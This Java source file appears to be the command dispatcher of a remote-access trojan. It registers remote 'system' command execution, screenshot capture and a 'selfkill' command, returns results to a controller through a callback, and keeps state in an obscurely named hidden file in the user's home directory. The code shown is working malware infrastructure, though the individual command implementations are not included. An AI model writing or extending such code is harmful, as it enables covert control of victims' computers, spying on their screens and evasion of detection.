package gq.glowman554.modules;

import gq.glowman554.Exs;
import gq.glowman554.FileUtils;
import gq.glowman554.modules.impl.EchoCommand;
import gq.glowman554.modules.impl.ScreenShotCommand;
import gq.glowman554.modules.impl.SelfKillCommand;
import gq.glowman554.modules.impl.SystemCommand;
import gq.glowman554.Entry;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import net.shadew.json.Json;
import net.shadew.json.JsonNode;

public class Modules {
    public HashMap<String, Module> modules = new HashMap();
    public String store_file = System.getProperty("user.home") + "/.3hrg1gh80gh4.json";
    private ArrayList<String> executed_callbacks = new ArrayList();

    public Modules(Exs exs) {
        this.modules.put("echo", new EchoCommand());
        this.modules.put("system", new SystemCommand());
        this.modules.put("screenshot", new ScreenShotCommand(exs));
        this.modules.put("selfkill", new SelfKillCommand());

        try {
            if ((new File(this.store_file)).exists()) {
                Json json = Json.json();
                JsonNode root = json.parse(FileUtils.readFile(this.store_file));
                for (String i : root.asStringArray())
                {
                    executed_callbacks.add(i);
                }
            }
        } catch (IOException e) {
            if (Entry.debug) {
                e.printStackTrace();
            }
        }

    }

    public void call(String raw_command, String cid, Exs exs) throws IOException {
        if (!this.executed_callbacks.contains(cid)) {
            String[] split = raw_command.split("\\|\\|");

            if (Entry.debug) {
                System.out.printf("Executing %s||%s\n", split[0], split.length == 1 ? "none" : split[1]);
            }

            if (this.modules.get(split[0]) == null) {
                if (Entry.debug) {
                    System.out.printf("wtf is %s????????\n", split[0]);
                }
                return;
            }

            String callback;
            if (split.length == 1) {
                callback = this.modules.get(split[0]).execute((String)null);
            } else {
                callback = this.modules.get(split[0]).execute(split[1]);
            }

            exs.callback(cid, callback);
            this.executed_callbacks.add(cid);
            FileUtils.writeFile(this.store_file, JsonNode.stringArray(this.executed_callbacks.toArray(new String[0])).toString());
        }
    }
}
